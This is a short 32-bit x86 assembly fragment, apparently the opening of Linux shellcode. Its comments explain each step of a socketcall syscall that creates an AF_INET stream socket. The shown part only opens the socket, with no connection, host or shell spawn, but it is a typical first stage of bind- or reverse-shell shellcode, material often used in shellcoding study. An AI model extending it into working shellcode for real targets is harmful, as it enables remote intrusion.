BITS 32

; zero out eax
xor		eax,eax

; socket()
push		eax		; push 0x0 on the stack: arg3(protocol) -> 0
mov		ebx,0x01	; socket sub-syscall: 0x01 -> socket()
push		0x01		; socket type: 0x01 -> SOCK_STREAM
push		0x02		; socket domain: 0x02 -> AF_INET
mov		ecx,esp		; let ecx point to our structure above
mov		al,102		; syscall 0x66 (socket())
int		0x80		; let the kernel do the stuff
